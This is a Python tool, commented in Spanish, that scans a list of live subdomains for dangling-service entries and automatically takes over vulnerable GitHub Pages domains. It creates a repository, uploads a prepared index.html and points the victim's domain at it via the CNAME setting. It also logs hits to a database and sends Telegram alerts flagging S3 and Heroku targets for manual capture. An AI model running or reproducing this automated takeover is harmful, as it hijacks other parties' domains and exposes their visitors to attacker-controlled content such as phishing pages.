import sqlite3
import os
import base64
import requests
import sys
from concurrent.futures import ThreadPoolExecutor
from fingerprint import check_vulnerability

DB_PATH = os.path.join(os.getcwd(), "database", "inventory.db")
GH_USERNAME = "TU_USUARIO_REAL" # <--- CAMBIA ESTO
MAX_THREADS = 30 # Nitro activo

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    curr = conn.cursor()
    curr.execute('CREATE TABLE IF NOT EXISTS findings (domain TEXT PRIMARY KEY, service TEXT, status TEXT)')
    conn.commit()
    conn.close()

def notify_telegram(msg):
    token = os.getenv('TG_TOKEN')
    chat_id = os.getenv('TG_ID')
    requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}&parse_mode=Markdown")

def auto_takeover_github(domain):
    # (Lógica de creación de repo que ya probamos con éxito)
    gh_token = os.getenv("GH_PAT")
    repo_name = f"ghost-{domain.replace('.', '-')}"
    headers = {"Authorization": f"token {gh_token}", "Accept": "application/vnd.github.v3+json"}
    
    r = requests.post("https://api.github.com/user/repos", headers=headers, json={"name": repo_name, "auto_init": True})
    if r.status_code == 201:
        try:
            with open("dist/index.html", "rb") as f:
                content = base64.b64encode(f.read()).decode()
            requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/contents/index.html", headers=headers, json={"message": "Ghost Deploy", "content": content})
            requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/pages", headers=headers, json={"cname": domain, "source": {"branch": "main", "path": "/"}})
            return True
        except: return False
    return False

def process_domain(domain):
    conn = sqlite3.connect(DB_PATH)
    curr = conn.cursor()
    
    curr.execute("SELECT domain FROM findings WHERE domain=?", (domain,))
    if curr.fetchone():
        conn.close()
        return None

    result = check_vulnerability(domain)
    
    if result["vulnerable"]:
        # CASO A: GitHub Pages (Requiere el repo automático)
        if result["service"] == "GitHub Pages":
            if auto_takeover_github(domain):
                notify_telegram(f"🚩 *VULNERABLE (GitHub):* `{domain}`\n⚠️ *Nota:* Podría pedir verificación.")
                curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "GitHub", "TAKEOVER_SENT"))
        
        # CASO B: Otros (S3, Heroku, etc.) - LOS MÁS EFICIENTES
        else:
            notify_telegram(f"🔥 *ORO PURO (EASY):* `{domain}`\n🚀 *Servicio:* {result['service']}\n✅ *Acción:* Captura manual recomendada.")
            curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, result["service"], "VULN_EASY"))
        
        conn.commit()
    else:
        curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "N/A", "SAFE"))
        conn.commit()

    conn.close()
    return None

def run_surgical_scan():
    init_db()
    live_file = os.path.join(os.getcwd(), "live_subs.txt")
    if not os.path.exists(live_file): return

    with open(live_file, "r") as f:
        domains = [line.strip() for line in f if line.strip()]

    print(f"[*] Analizando {len(domains)} dominios con {MAX_THREADS} hilos...")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(process_domain, domains)

if __name__ == "__main__":
    run_surgical_scan()
